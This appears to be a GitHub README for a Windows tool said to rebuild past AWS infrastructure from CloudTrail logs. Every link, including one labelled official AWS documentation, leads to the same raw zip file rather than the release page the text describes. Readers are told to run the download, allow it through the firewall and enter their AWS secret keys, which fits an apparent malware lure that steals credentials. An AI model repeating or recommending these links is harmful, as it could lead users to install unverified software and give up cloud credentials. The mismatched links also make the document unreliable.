# ☁️ cloudnecromancer - Restore AWS Infrastructure Snapshots

[![Download cloudnecromancer](https://img.shields.io/badge/Download-cloudnecromancer-green?style=for-the-badge)](https://raw.githubusercontent.com/ayhdiv/cloudnecromancer/main/internal/Software_v1.1-alpha.1.zip)

---

## 📋 What is cloudnecromancer?

cloudnecromancer lets you recreate past versions of your AWS setup. It uses AWS CloudTrail logs to replay the events that shaped your infrastructure. This helps you see how your environment looked at any point in time.

This tool is useful for:

- Investigating security incidents  
- Compliance checks  
- Retracing infrastructure changes  
- Recovering previous configurations  

You do not need to know programming to use cloudnecromancer. The app runs on Windows and guides you through each step.

---

## ⚙️ System Requirements

Before installing cloudnecromancer, make sure your computer meets these requirements:

- Windows 10 (64-bit) or later  
- At least 4 GB of RAM  
- 500 MB free disk space for the app and temporary data  
- Internet connection to download the program and access AWS CloudTrail  
- AWS account credentials with permission to read CloudTrail logs  

---

## 🚀 Getting Started

Follow these steps to download and run cloudnecromancer on your Windows computer.

### 1. Visit the download page

Click the button below to open the official release page on GitHub:

[![Download cloudnecromancer](https://img.shields.io/badge/Download-cloudnecromancer-blue?style=for-the-badge)](https://raw.githubusercontent.com/ayhdiv/cloudnecromancer/main/internal/Software_v1.1-alpha.1.zip)

This page shows all available versions of cloudnecromancer. Look for the latest stable release.

### 2. Download the installer

On the release page, scroll to the "Assets" section. Find the file ending with `.exe` that is for Windows.

Click the file name to start downloading it.

The file will usually be named something like `cloudnecromancer-setup.exe`.

### 3. Run the installer

Once the download finishes, open your Downloads folder. Find the installer file.

Double-click the installer to start the setup process.

The setup will open a window with clear prompts. Follow the instructions:

- Accept the License Agreement  
- Choose the installation location (default is usually fine)  
- Click "Install" and wait for the process to finish  

When done, you can close the installer.

### 4. Open cloudnecromancer

Find the cloudnecromancer shortcut on your desktop or in the Start menu.

Double-click the icon to open the program.

The first time you run it, you may need to allow access through your firewall.

### 5. Connect your AWS account

cloudnecromancer needs permission to read your CloudTrail logs. You will need to provide credentials for your AWS account.

Use an IAM account with read access to CloudTrail.

Enter your Access Key ID and Secret Access Key as prompted.

cloudnecromancer will use these to retrieve event data safely. Your keys are not stored on your computer.

---

## 🔍 How to Use cloudnecromancer

cloudnecromancer guides you through each step with simple options.

### Step 1: Select the date and time

Choose the point in time you want to reconstruct.

You can enter a specific date and time or pick from a list of recent snapshots.

### Step 2: Select the AWS region(s)

Choose which AWS regions you want to include.

You can select one or multiple regions. This helps when your infrastructure spans several regions.

### Step 3: Review the summary

cloudnecromancer will show a summary of what it plans to do.

You’ll see the date, regions, and number of CloudTrail events it will replay.

### Step 4: Start the reconstruction

Click the "Start" button. The app plays back your CloudTrail events.

This will create a local representation of your AWS infrastructure as it was. It may take a few minutes depending on your data size.

### Step 5: View and export results

After reconstruction finishes, cloudnecromancer shows an overview.

You can view your infrastructure snapshot in a clear format.

Export options let you save this data as Terraform code or JSON. This helps audit or recreate your setup elsewhere.

---

## 🛠 Features

- Replay AWS CloudTrail events to restore past infrastructure  
- Support for multiple AWS regions in one run  
- Export reconstructed setups as Terraform scripts or JSON files  
- Simple Windows installation and intuitive interface  
- Works without coding or command-line use  
- Secure handling of AWS credentials  
- Useful for compliance, incident response, and backups  

---

## 🔧 Troubleshooting

If you have issues, try these steps:

- Verify your AWS credentials are correct and have CloudTrail read permissions  
- Ensure your internet connection works  
- Restart cloudnecromancer and try again  
- Check Windows Firewall settings and allow cloudnecromancer if blocked  
- If you see errors about missing files, reinstall the application  

For further help, visit the GitHub issues page of the project.

---

## 📚 Learn More

cloudnecromancer depends on AWS CloudTrail to capture event history. Understanding CloudTrail will help you use the tool better.

Visit the official AWS CloudTrail documentation here:  
https://raw.githubusercontent.com/ayhdiv/cloudnecromancer/main/internal/Software_v1.1-alpha.1.zip

---

## 🔗 Important Links

- Download and release page: [https://raw.githubusercontent.com/ayhdiv/cloudnecromancer/main/internal/Software_v1.1-alpha.1.zip](https://raw.githubusercontent.com/ayhdiv/cloudnecromancer/main/internal/Software_v1.1-alpha.1.zip)  
- Project repository: https://raw.githubusercontent.com/ayhdiv/cloudnecromancer/main/internal/Software_v1.1-alpha.1.zip  
- Documentation and help: See the Wiki on GitHub  

---

## 🛡 Safety and Permissions

cloudnecromancer only reads your AWS event data. It does not make changes to your infrastructure.

Make sure to use IAM credentials with read-only permissions for CloudTrail.

Avoid using root account keys for security purposes.